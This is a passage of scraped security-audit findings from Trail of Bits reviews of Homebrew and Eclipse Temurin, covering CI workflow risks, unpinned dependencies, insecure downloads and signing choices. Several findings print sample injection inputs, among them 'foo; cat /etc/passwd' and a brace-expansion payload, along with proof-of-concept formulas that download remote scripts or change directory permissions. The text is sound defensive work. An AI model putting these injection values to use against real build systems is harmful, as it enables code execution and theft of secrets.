exploit, since any package trying to exploit this would have an invalid location for the packages keg and thus could not be bottled in the rst place. The following pieces of code are used to decide where to put the output from brew bottle: filename = Bottle::Filename.create(formula, bottle_tag.to_sym, rebuild) local_filename = filename.to_s bottle_path = Pathname.pwd/filename Figure 16.1: Denition of bottle_path (brew/Library/Homebrew/dev-cmd/bottle.rb:356358) sig { returns(String) } def to_s \"#{name}--#{version}#{extname}\" end alias to_str to_s Figure 16.2: Code used in Bottle::Filename to calculate bottle_path as a string (brew/Library/Homebrew/software_spec.rb:306310) By maliciously setting the name or version of a package, an attacker could cause the bottle_path to contain a path traversal, placing the output le in a dierent directory than intended. Recommendations Short term, remove any special characters from the name and version before using it when creating the bottle_path. Preferably, also disallow formulas from having these special characters in their version names in the rst place (see TOB-BREW-4). Long term, audit any uses of user-inputted strings to create paths. Ensure that the input is properly sanitized before being used.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "17. FileUtils.rm_rf does not check if les are deleted ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "When using FileUtils.rm_rf, Ruby masks all errors, not just le not found errors, which can be surprising. This can mask issues that prevent the le or directory from being deleted. # Removes the entry given by +path+, # which should be the entry for a regular file, a symbolic link, # or a directory. # # Argument +path+ # should be {interpretable as a path}[rdoc-ref:FileUtils@Path+Arguments]. # # Optional argument +force+ specifies whether to ignore # raised exceptions of StandardError and its descendants. # # Related: FileUtils.remove_entry_secure. # def remove_entry(path, force = false) Entry_.new(path).postorder_traverse do |ent| begin ent.remove rescue raise unless force end end rescue raise unless force end module_function :remove_entry Figure 17.1: Ruby implementation of remove_entry A number of places in the code are worth double checking to ensure that ignoring all errors related to deletion is intentional. Figure 17.2 shows some examples. def cleanup_bottle_etc_var(formula) bottle_prefix = formula.opt_prefix/\".bottle\" # Nuke etc/var to have them be clean to detect bottle etc/var # file additions. Pathname.glob(\"#{bottle_prefix}/{etc,var}/**/*\").each do |bottle_path| prefix_path = bottle_path.sub(bottle_prefix, HOMEBREW_PREFIX) FileUtils.rm_rf prefix_path end end def verify_local_bottles with_env(HOMEBREW_DISABLE_LOAD_FORMULA: 1) do  # Delete these files so we don't end up uploading them. files_to_delete = mismatched_checksums.keys + unexpected_bottles files_to_delete += files_to_delete.select(&:symlink?).map(&:realpath) FileUtils.rm_rf files_to_delete test \"false\" # ensure that `test-bot` exits with an error. false end end Figure 17.2: cleanup_bottle_etc_var and verify_local_bottles found in homebrew-test-bot/lib/tests/formulae.rb Exploit Scenario Code that assumes the absence of specic les or directories may have that assumption violated. An attacker can potentially induce this issue using TOB-BREW-14, which allows formulas to change the permissions of certain brew directories. Recommendations Short term, we recommend auditing all usages of FileUtils.rm_rf to ensure that it is safe to continue if the le or directory deletion does not succeed in removing the expected items. Long term, we recommend creating a helper that ignores ENOENT but raises on other potential errors that may occur when deleting les or directories.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "18. Use of pull_request_target in GitHub Actions workows ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "The vendor-gems and vendor-node-modules workows both declare pull_request_target as a trigger, allowing third-party pull requests to run code within the context of the targeted (i.e., upstream) repository: name: Vendor Gems on: pull_request: paths: - Library/Homebrew/dev-cmd/vendor-gems.rb - Library/Homebrew/Gemfile* push: paths: - .github/workflows/vendor-gems.yml branches-ignore: - master pull_request_target: workflow_dispatch: inputs: pull_request: description: Pull request number required: true Figure 18.1: Workow triggers for vendor-gems.yml name: Vendor node_modules on: pull_request_target: types: - labeled workflow_dispatch: inputs: pull_request: description: Pull request number required: true Figure 18.2: Workow triggers for vendor-node-modules.yml Because pull_request_target allows arbitrary third-party PRs to run arbitrary code in the context of the target repository, it is considered dangerous and generally discouraged by GitHub. GitHub particularly cautions against the use of pull_request_target in any context where an attacker may be able to induce npm install or a similar vector for arbitrary code execution, which is the primary purpose for both vendor-gems.yml and vendor-node-modules.yml. Both workows contain partial mitigations against the risks of pull_request_target. vendor-gems.yml appears to ignore the event unless it comes from an ostensibly trusted user (dependabot[bot], indicating GitHubs Dependabot): jobs: vendor-gems: if: > github.repository_owner == 'Homebrew' && ( github.event_name == 'workflow_dispatch' || github.event_name == 'pull_request' || github.event_name == 'push' || ( github.event.pull_request.user.login == 'dependabot[bot]' && contains(github.event.pull_request.title, '/Library/Homebrew') ) ) Figure 18.3: Event ltering in vendor-gems.yml vendor-node-modules.yml uses the labeled sub-lter to restrict the workow to only pull requests that have been explicitly labeled with a safe label by a reviewer. Regardless, both workows run arbitrary code via package management steps, meaning that a malicious or compromised package may be able to run arbitrary code in each workows respective repository (including access to repository secrets and other sensitive materials). Exploit Scenario Scenario 1: A compromised RubyGem or Node package inspects its running environment, determines that it is executing in the context of a pull_request_target, and exltrates environment variables or other secrets (or potentially runs code in the context of the trusted repository, establishing persistence). Scenario 2: The labeled sub-lter for pull_request_target is subject to race conditions, allowing an attacker to push new changes after a workow has been labeled (indicating trust and approval) but has not yet been picked up by a workow runner. Recommendations Short term, we recommend that the Homebrew maintainers conduct a review of these workows and determine what, if any, further lters and restrictions can be applied to their pull_request_target triggers. In particular, we recommend that both be fully restricted to dependabot[bot] or similar trusted account identities, that both enforce labeling, and that neither exposes unnecessary permissions or secrets. Long term, we recommend that Homebrew refactor these workows to avoid pull_request_target entirely. In particular, we recommend that Homebrew consider automation ows that use only safer triggers like pull_request, or that workows use a comment-based ow to enable trusted users to trigger modications to PRs.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "19. Use of unpinned third-party workow ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Workows throughout the Homebrew repositories make direct use of the third-party ruby/setup-ruby@v1 workow. The following example occurs in review-cask-pr.yml: - name: Set up Ruby uses: ruby/setup-ruby@v1 with: ruby-version: '2.6' Figure 19.1: Use of ruby/setup-ruby@v1 in review-cask-pr.yml Git tags are malleable. This means that, while ruby/setup-ruby is pinned to v1, the upstream may silently change the reference pointed to by v1. This can include malicious re-tags, in which case Homebrews various dependent workows will silently update to the malicious workow. GitHubs security hardening guidelines for third-party actions encourage developers to pin third-party actions to a full-length commit hash. Generally excluded from this is ocial actions under the actions org; however, setup-ruby is not an ocial action. Specically aected workows include:  homebrew-actions/.github/workflows/review-cask-pr.yml  formulae.brew.sh/.github/workflows/scheduled.yml  formulae.brew.sh/.github/workflows/tests.yml  brew/.github/workflows/docs.yml  homebrew-test-bot/.github/workflows/tests.yml Exploit Scenario An attacker (or compromised maintainer) may silently overwrite the v1 tag on ruby/setup-ruby with a malicious version of the action, causing a large number of security-sensitive Homebrew workows to run malicious code. Recommendations Short term, we recommend that Homebrew replace the current v1 tag on each use of ruby/setup-ruby with a full-length commit hash corresponding to the revision that each workow is intended to use. Longer term, we recommend that Homebrew leverage Dependabots support for GitHub Actions to keep these hashes up to date (complemented by maintainer reviews).", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "20. Unpinned dependencies in formulae.brew.sh ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "formulae.brew.sh is rendered by Jekyll, and species its dependencies in a top-level Gemfile: gem \"faraday-retry\" gem \"jekyll\" gem \"jekyll-redirect-from\" gem \"jekyll-remote-theme\" gem \"jekyll-seo-tag\" gem \"jekyll-sitemap\" gem \"rake\" Figure 20.1: Excerpted dependencies in formulae.brew.shs Gemfile Notably, all current dependencies for the sites build are currently unpinned. Combined with the absence of a Gemfile.lock, this means that every re-build of the site potentially installs dierent (and new) versions of each dependency. Prior to formulae.brew.shs hosting of Homebrews JSON formula API, the sites security prole was minimal. However, now that formulae.brew.sh serves as the source of truth for installable formulae, its security prole is substantial. Consequently, all dependencies used to build the site should be fully pinned to minimize the risk of downstream compromise or package takeover. Exploit Scenario An attacker who manages to take over or compromise one of formulae.brew.shs dependencies may be able to execute arbitrary code during the sites generation and deployment, including:  Potentially stealing or maliciously using the current JSON API signing key, resulting in a total compromise of bottle integrity and authenticity;  Defacing or maliciously modifying the Homebrew website (e.g. to include malicious recommendations for users) Even without access to the signing key, an attacker may be able to perform a downgrade attack on Homebrew users by forcing the JSON API to serve an older copy of the signed JSON response, resulting in downstream users installing older, vulnerable copies of formulae. Recommendations Short term, we recommend that Homebrew apply version pins to each dependency specied in formulae.brew.shs Gemfile. Additionally, we recommend that Homebrew check an equivalent Gemfile.lock into the source tree, providing additional integrity to the version pins. Long term, we recommend that Homebrew use Dependabot to track updates to the Gemfile-specied dependencies and, with maintainer review, perform all updates through Dependabot. We also recommend that Homebrew evaluate each dependencys maintenance status and importance and, if possible, eliminate as many as possible as part of a larger eort to reduce the overall external security prole of formulae.brew.sh.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "21. Use of RSA for JSON API signing ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Homebrew currently signs all JSON API responses using an RSA key, using the RSA-PSS signing scheme with SHA512 as the cryptographic digest and mask generation function. signature_data = Base64.urlsafe_encode64( PRIVATE_KEY.sign_pss(\"SHA512\", signing_input, salt_length: :digest, mgf1_hash: \"SHA512\") ) Figure 21.1: RSA-PSS signature generation in sign-json.rb Homebrew currently uses a 4096-bit RSA key, and RSA-PSS is a well-studied, strong instantiation of an RSA signing scheme with a formal security proof. At the same time, RSA is a dangerous cryptosystem that reects historical constraints, exposes excessive parameters to the key-generating party, and produces larger signatures than corresponding security margins in other cryptosystems. Exploit Scenario We conducted a review of Homebrews current signing key and found that it uses a reasonable public exponent (e = 65537) and has a substantial security margin (4096 bits, equivalent to greater than 128 bits of symmetric security). Combined with Homebrews use of RSA-PSS, we believe that the current use of RSA does not represent a substantial risk to Homebrews JSON API signatures. As such, this is a purely informational nding. Recommendations We recommend no short or medium-term actions. Long term, we recommend that Homebrews next key rotation replace RSA and RSA-PSS with an ECC key and ECDSA (or EdDSA, if client support permits). ECC keys and signatures are substantially smaller than their RSA equivalents with comparable security margins and have fewer user-controlled parameters.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "22. Bottles beginning - can lead to unintended options getting passed to rm ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "If a bottle contains a -, this may lead to unintended options getting passed to rm. - run: rm -rvf *.bottle*.{json,tar.gz} Figure 22.1: Potentially buggy workow Exploit Scenario This is very unlikely to be exploitable but may produce some surprising behavior when combined with TOB-BREW-4. Recommendations We recommend changing the workow to use the following. - run: rm -rvf -- *.bottle*.{json,tar.gz} Figure 22.2: A possible solution to the buggy workow We also recommend running actionlint on the other repos besides just Homebrew/brew as noted in appendix C.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "23. Code injection through inputs in multiple actions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Homebrew/homebrew-actions contains a wide variety of utility actions used throughout the Homebrew project. Many of these actions have congurable inputs, allowing their calling workows and users to supply values/relevant pieces of state. In many cases, these inputs are treated as variables, and expanded directly into shell or Ruby expressions using GitHub Actions ${{ .. }} expansion syntax: steps: - run: brew bump --open-pr --formulae ${{ inputs.formulae }} if: inputs.formulae != '' shell: sh env: HOMEBREW_DEVELOPER: \"1\" HOMEBREW_GITHUB_API_TOKEN: ${{inputs.token}} Figure 23.1: An example of an input expansion in homebrew-actions/bump-packages However, performing blind expansions of potentially user-controlled inputs like this is dangerous, as GitHubs ${{  }} expansion syntax performs no quoting or escaping of the expanded value. Consequently, an attacker may leverage an action input to perform a shell injection: inputs.formulae may be contrived to contain foo; cat /etc/passwd, resulting in brew bump --open-pr --formulae foo; cat /etc/passwd being run by the surrounding workow. This pattern appears widely in the actions dened under homebrew-actions. The following (not guaranteed to be exhaustive) list of actions contains at least one potentially user-controlled code injection through inputs:  bump-formulae  bump-packages  count-bottles  failures-summary-and-bottle-result  find-related-workflow-run-id  pre-build  setup-commit-signing The impact of these varies by action and by each actions workow usage, including relevant workow triggers. In the worst-case scenario, an action may be used by a workow that takes entirely PR-controlled inputs, allowing an untrusted PR to make changes to the workows behavior surreptitiously. Exploit Scenario Depending on how these actions are applied to their respective workows, an attacker may be able to execute arbitrary shell or Ruby code in the context of a workow step that is otherwise constrained to an expected set of operations. These expansions may also allow a maintainer with limited privileges (e.g., the ability to manually dispatch some workows) to pivot to greater privileges by injecting arbitrary code into those workows. Recommendations Generally speaking, any ${{  }} expansion in a shell or other executable context can be rewritten into an injection-free form through the use of environment variables. For example, the following: - run: ./count.sh '${{ inputs.working-directory }}' '${{ inputs.debug }}' working-directory: ${{ github.action_path }} shell: bash id: count Figure 23.2: Two potentially input unsafe expansions Could be rewritten as: - run: ./count.sh ${INPUT_WORKING_DIRECTORY} ${INPUT_DEBUG} working-directory: ${{ github.action_path }} shell: bash id: count env: INPUT_WORKING_DIRECTORY: ${{ inputs.working-directory }} INPUT_DEBUG: ${{ inputs.debug }} Figure 23.3: Unsafe expansions rewritten to use environment variables", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "24. Use of PGP for commit signing ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "The current setup-commit-signing action uses a PGP key: git config --global user.signingkey $GPG_KEY_ID git config --global commit.gpgsign true Figure 24.1: PGP key conguration in setup-commit-signing PGP is a generally dated and insecure cryptographic ecosystem: while individual applications of PGP can be secure, its overall complexity, insecure defaults, and kitchen sink design is generally a poor t for modern applications, including digital signatures on Git commits. Git has supported commit signing with SSH keys since Git 2.34 (released in 2021), and GitHub has supported SSH commit verication since 2022. This allows users to fully replace their PGP signing key with an SSH signing key, which in turn provides more modern defaults in a smaller overall cryptographic package (meaning a reduced attack surface). Recommendations We make no immediate or medium-term recommendations for this nding. In the long term, we recommend that Homebrew consider replacing its current commit signing key with an SSH-based signing key. In particular, we recommend that Homebrew use an SSH-based Ed25519 key, given its widespread support in both the SSH and Git ecosystems.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "7. Use of ldd on untrusted inputs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "On Linux, Homebrew uses ldd to list the dynamic dependencies of an executable (i.e., the shared libraries that it declares as dependencies): ldd = DevelopmentTools.locate \"ldd\" ldd_output = Utils.popen_read(ldd, path.expand_path.to_s).split(\"\\n\") Figure 7.1: Using ldd to collect shared object dependencies This metadata is produced for all ELF les in a binary, as part of providing the Linux equivalent of Homebrew-on-Rubys binary relocation functionality. Running ldd can result in arbitrary code execution when a binary has a custom ELF interpreter specied. This may allow a malicious bottle to run arbitrary code outside of the context of the installing sandbox (since relocation is not sandboxed) with relative stealth (since no code is obviously executed). Exploit Scenario An attacker contrives an ELF binary with a custom .interp section, enabling arbitrary code execution. This execution occurs surreptitiously during Homebrews binary relocation phase, before the user expects any formula-provided executables to run. Recommendations Short term, Homebrew can check an ELFs interpreter (in the .interp section) before loading it with ldd and, if it appears to be a non-standard interpreter, refuse to handle it. Long term, Homebrew can replace ldd with similar inspection tools, such as readelf or objdump. Both are capable of collecting a binarys dynamic linkages without arbitrary code execution.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "8. Formulas allow for external resources to be downloaded during the install step ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "If a package downloads external resources during the install phase of the process, the integrity of the les is never validated by brew itself. This could lead to a case where the upstream resource is changed unexpectedly or maliciously, which could also aect the reproducibility of the build. class InstallNetwork < Formula desc \"\" homepage \"\" url \"https://ftp.gnu.org/gnu/hello/hello-2.12.1.tar.gz\" version \"0.0.0\" sha256 \"8d99142afd92576f30b0cd7cb42a8dc6809998bc5d607d88761f512e26c7db20\" license \"\" def install system \"curl\", \"-L\", \"-o\", \"#{prefix}/build.sh\", \"https://example.com/files/build.sh\" end test do system \"false\" end end Figure 8.1: Example formula that downloads unveried external resources Exploit Scenario An attacker takes over an unveried upstream resource and injects malicious code into a brew bottle while it is being built. Recommendations Short term, Homebrew should check that no existing packages download unexpected resources over the network that are not explicitly declared. Long term, Homebrew should pre-download the extra required resources, (after verifying their integrity in an earlier step) and sandbox network requests in the build/post-install stage. This will ensure that packages do not inadvertently download resources.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "14. Sandbox allows changing permissions for important directories ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "The sandbox allows a formula build, post-install, and test step to change the permissions of the brew cache directory. class ChmodTest < Formula desc \"\" homepage \"\" url \"https://ftp.gnu.org/gnu/hello/hello-2.12.1.tar.gz\" version \"0.0.0\" sha256 \"8d99142afd92576f30b0cd7cb42a8dc6809998bc5d607d88761f512e26c7db20\" license \"MIT\" def install system \"chmod\", \"ug-w\", \"/Users/user/Library/Caches/Homebrew\" # system \"chmod\", \"777\", \"/Users/user/test_file\" # this gets blocked end test do system \"false\" end end Figure 14.1: Sample formula that changes directory permissions Exploit Scenario Given the ability to add or remove permissions in unexpected brew directories, a formula either makes les or directories too permissive or not permissive enough, thus preventing les from being read, written, created, or deleted. Recommendations Homebrew should use the sandbox to ensure that formulas do not change the permissions of unexpected les or directories, especially directories important to brew. This is governed by the file-write-mode sandbox operation.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "15. Homebrew supports only end-of-life versions of Ruby ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Homebrew currently expects to be run under Ruby 2.6, which was declared end-of-life (EOL) by the Ruby maintainers in April 2022. Newer versions of Ruby that have not yet reached EOL are considered unsupported by Homebrew, and are not yet available through homebrew-portable-ruby. Exploit Scenario This is a purely informational nding; although unpatched CVEs exist for Ruby 2.6 and other EOL Ruby versions, the Homebrew maintainers do not consider these CVEs relevant to Homebrews use of Ruby. Homebrews maintainers have indicated that they intend to upgrade Homebrew to Ruby 3.2, putting them on a version of Ruby that is receiving security updates. Recommendations We recommend that Homebrew upgrade to Ruby 3.2.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "25. Unnecessary domain separation between signing key and key ID ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Homebrews JSON API includes JSON Web Signature-formatted signatures. These signatures include (unauthenticated) metadata designed to assist the verifying party, including a key identier intended to accelerate lookup when multiple public keys are being considered. In Homebrews case, the current one and only signing key is identied by the homebrew-1 identier, which is matched against during signature verication: homebrew_signature = signatures&.find { |sig| sig.dig(\"header\", \"kid\") == \"homebrew-1\" } Figure 25.1: Searching for a signature that designates homebrew-1 as its signing key The use of a human-readable key identier (homebrew-1) results in domain separation between the signing key and its identier: nothing positively binds the identier to the signing key other than shared convention. This can (but does not always) become a source of confusion in situations with multiple keys, and can (but does not always) allow attackers to substitute older keys or unexpected verication materials. One typical technique for eliminating this domain separation is to take a strong cryptographic digest of each public key (canonicalized in some standard format, such as the DER encoding of the subjectPublicKeyInfo representation) and use that digest as the key identier. This ensures that a given public key has only one tightly bound identier. Recommendations Preventing domain separation here addresses a theoretical concern; we make no specic short- or medium-term recommendations. Long-term, we recommend that the Homebrew maintainers consider enforcing that key identiers are strongly bound to their public keys, e.g. by dening a keys identier as the SHA-256 digest of the keys DER-encoded subjectPublicKeyInfo representation (or any other stable, canonical representation). A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "1. Command injection vulnerability in WinRM script ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "The run_winrm function allows callers to specify commands to run on a Vagrant virtual machine (VM). It is the primary functionality of the startScriptWin.py script, which is itself executed by the vagrantPlaybookCheck.sh shell script. This function receives input from command-line arguments and uses string concatenation to build a shell command to execute on a Vagrant VM: def run_winrm (vmIP, buildArgs , mode): cmd_str = \"Start-Process powershell.exe -Verb runAs; cd C:/tmp; sh C:/vagrant/pbTestScripts/\" print (mode) if mode == 1 : cmd_str += \"buildJDKWin.sh \" else : cmd_str += \"testJDKWin.sh \" cmd_str += buildArgs print ( \"Running : session = winrm.Session( str (vmIP), auth=( 'vagrant' , 'vagrant' )) session.run_ps(cmd_str, sys.stdout, sys.stderr) %s \" %cmd_str) Figure 1.1: A shell command generated with string concatenation ( infrastructure/ansible/pbTestScripts/startScriptWin.py:1222 ) If an attacker can inuence the buildArgs parameter, either through the startScriptWin.py or vagrantPlaybookCheck.sh command-line arguments, then they could be able to execute code on the Vagrant VM. The Eclipse Foundation has conrmed that these parameters can be specied in a Jenkins job web form; however, access to these forms is restricted. Exploit Scenario An attacker sends a malicious shell payload through the --build-fork or --build-branch command-line argument to vagrantPlaybookCheck.sh , or through the -a command-line argument to startScriptWin.py . While building the cmd_str , the 17 OSTIF Eclipse: Temurin Security Assessment run_winrm function concatenates the buildArgs string and executes it on the Vagrant VM. The attacker is able to execute arbitrary commands by using shell operators such as ; , && , or || , and to append additional commands. It is worth noting that spaces cannot be used in the payload if it is sent to vagrantPlaybookCheck.sh . However, shell brace expansion can be used to bypass this restriction. For example, the following command results in successful command injection: ./vagrantPlaybookCheck.sh ... --branch main;{echo,command,injection}; ... Recommendations Short term, build a list of command arguments to be passed to the run_winrm method instead of using string concatenation to generate a command argument string and passing it to run_ps . Long term, implement static analysis rules to automatically detect string concatenation data that is passed to the run_ps method. 18 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Docker Compose ports exposed on all interfaces ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "The docker-compose.yml conguration le for the api.adoptium.net API server (which is used in development but not in production) species Docker ports using a ports conguration option of 27017:27017 for the MongoDB container and 8080:8080 for the front-end container (see gure 2.1). This means that these ports are accessible not just to other processes running on the same computer, but also from other computers on the same network. version : '3.6' services : mongodb : image : mongo:4.2 ports : - \"27017:27017\" frontend : depends_on : - mongodb image : \"adoptium-api\" build : context : . dockerfile : Dockerfile ports : - \"8080:8080\" environment : MONGODB_HOST : mongodb updater : depends_on : - mongodb image : \"adoptium-api\" command : \"java -jar /deployments/adoptium-api-v3-updater-runner.jar\" build : context : . dockerfile : Dockerfile environment : MONGODB_HOST : mongodb GITHUB_TOKEN : \"${GITHUB_TOKEN}\" GITHUB_APP_ID : \"${GITHUB_APP_ID}\" GITHUB_APP_PRIVATE_KEY : \"${GITHUB_APP_PRIVATE_KEY}\" 19 OSTIF Eclipse: Temurin Security Assessment GITHUB_APP_INSTALLATION_ID : \"${GITHUB_APP_INSTALLATION_ID}\" Figure 2.1: api.adoptium.net/docker-compose.yml Exploit Scenario A Temurin developer runs this docker-compose.yml le while on a public Wi-Fi network. An attacker who is on the same network connects to the MongoDB database running on the developers computer; this database is available on port 27017 without any password protection. The attacker modies an entry in the database containing a link to a binary le, which eventually causes the developer to unwittingly download and run a malicious le. Recommendations Short term, set these conguration values to 127.0.0.1:27017:27017 and 127.0.0.1:8080:8080 , instead of 27017:27017 and 8080:8080 . Long term, use static analysis rules to automatically detect ports that are exposed on all interfaces; the set of Semgrep rules provided alongside this report includes such a rule. 20 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Insecure installation of Xcode software ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "The install-xcode.sh script uses unencrypted HTTP endpoints to download Xcode command-line tools and then installs them using the -allowUntrusted ag: if [[ \" $osx_vers \" -eq 7 ]] || [[ \" $osx_vers \" -eq 8 ]]; then if [[ \" $osx_vers \" -eq 7 ]]; then DMGURL =http://devimages.apple.com/downloads/xcode/command_line_tools_for_xcode_os_x_lion_april_ 2013.dmg fi if [[ \" $osx_vers \" -eq 8 ]]; then DMGURL =http://devimages.apple.com/downloads/xcode/command_line_tools_for_osx_mountain_lion_apri l_2014.dmg fi TOOLS =cltools.dmg curl \" $DMGURL \" -o \" $TOOLS \" TMPMOUNT = ` /usr/bin/mktemp -d /tmp/clitools.XXXX ` hdiutil attach \" $TOOLS \" -mountpoint \" $TMPMOUNT \" -nobrowse # The \"-allowUntrusted\" flag has been added to the installer # command to accomodate for now-expired certificates used # to sign the downloaded command line tools. installer -allowUntrusted -pkg \" $( find $TMPMOUNT -name '*.mpkg' ) \" -target / hdiutil detach \" $TMPMOUNT \" rm -rf \" $TMPMOUNT \" rm \" $TOOLS \" fi Figure 3.1: Untrusted installation of Xcode software ( infrastructure/ansible/playbooks/AdoptOpenJDK_ITW_Playbook/roles/Common/ scripts/install-xcode.sh:2344 ) Also, the OS X version check performs an imprecise comparison. This increases the likelihood that the untrusted installation will be performed on versions it is not intended for. The osx_vers variable considers only the system minor version rather than the minor and major version: 21 OSTIF Eclipse: Temurin Security Assessment osx_vers = $( sw_vers -productVersion | awk -F \".\" '{print $2}' ) Figure 3.2: The code checks only the system minor version. ( infrastructure/ansible/playbooks/AdoptOpenJDK_ITW_Playbook/roles/Common/ scripts/install-xcode.sh:2 ) This script is meant to perform the untrusted installation only if it is running on OS X version 10.7 or 10.8. Because the code checks only the minor version, this script will also perform the untrusted installation on macOS versions 11.7, 12.7, 13.7, and so on. Exploit Scenario An attacker is in a privileged network position relative to a system installing Xcode software and is able to actively intercept and modify the systems network trac. Because the software is downloaded over HTTP and its installation is untrusted, the attacker can modify the download in transit and replace the software with a malicious version. Recommendations Short term, have the script use HTTPS to download the software and ensure the integrity of the software by validating it against a known SHA-256 checksum. Long term, deprecate and remove support for OS X and macOS versions requiring an untrusted installation of the Xcode command-line tools. 22 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "4. Insecure software downloads in Ansible playbooks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "Ansible playbooks are used to congure various parts of the system infrastructure. These playbooks install software and generally congure systems to be in a consistent state. Many of the playbooks install software and package data in an insecure manner, using unencrypted channels such as HTTP (gure 4.1) or disabling certicate validation when performing the download (gure 4.2). The full list of such instances is provided in appendix C. - name : Add Azul Zulu GPG Package Signing Key for x86_64 apt_key : url : http://repos.azulsystems.com/RPM-GPG-KEY-azulsystems state : present when : - ansible_architecture == \"x86_64\" tags : [ patch_update , azul-key ] Figure 4.1: HTTP download ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Common /tasks/Ubuntu.yml:2531 ) - name : Enable EPEL release (not CentOS8) yum : name : epel-release state : installed update_cache : yes validate_certs : no when : ansible_distribution_major_version != \"8\" tags : patch_update Figure 4.2: Disabled SSL certicate validation ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Common /tasks/CentOS.yml:1522 ) Note that there are many more instances in which validate_certs is disabled. However, packages or downloads that specify a checksum alongside disabled validation are considered secure. This conguration was assumed to mean trust on rst use and that 23 OSTIF Eclipse: Temurin Security Assessment integrity of the software has been veried out of band and validated with a checksum. An example of the conguration is provided below: - name : Download expat get_url : url : https://github.com/libexpat/libexpat/releases/download/R_2_2_5/expat-2.2.5.tar.bz2 dest : /tmp/ mode : 0440 timeout : 25 validate_certs : no checksum : sha256:d9dc32efba7e74f788fcc4f212a43216fc37cf5f23f4c2339664d473353aedf6 Figure 4.3: SSL certicate validation disabled and checksum provided ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Common /tasks/openSUSE.yml:151158 ) Exploit Scenario An attacker is in a privileged network position relative to a system installing software using an Ansible playbook and is able to actively intercept and modify the systems network trac. Because the software is downloaded over HTTP, the attacker can modify the download in transit and replace the software with a malicious version. Recommendations Short term, change HTTP downloads to HTTPS, and enable SSL certicate validation. Long term, implement static analysis rules to automatically detect HTTP downloads and disabled SSL certicate validation in Ansible playbooks. 24 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "5. Signature verication disabled during software installation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "Software package signatures are veried upon installation to ensure their authenticity. GNU Privacy Guard (GPG) signatures are a common signing method. A number of Ansible playbooks disable GPG verication when installing packages. The following snippets show four locations where verication is disabled: - name : Sed change gpgcheck for gcc repo on x86_64 replace : path : /etc/zypp/repos.d/devel_gcc.repo regexp : 'gpgcheck=1' replace : \"gpgcheck=0\" when : - (ansible_distribution_major_version == \"12\" and ansible_architecture == \"x86_64\") tags : SUSE_gcc48 Figure 5.1: openSUSE playbook disabling GPG verication ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Common /tasks/openSUSE.yml:2936 ) - name : Sed change gpgcheck for SLES12 on x86_64 command : sed 's/gpgcheck=1/gpgcheck=0/' -i /etc/zypp/repos.d/cuda.repo when : - cuda_installed.stat.islnk is not defined - ansible_architecture == \"x86_64\" - ansible_distribution == \"SLES\" or ansible_distribution == \"openSUSE\" - ansible_distribution_major_version == \"12\" tags : - nvidia_cuda_toolkit #TODO: rpm used in place of yum or rpm_key module - skip_ansible_lint 25 OSTIF 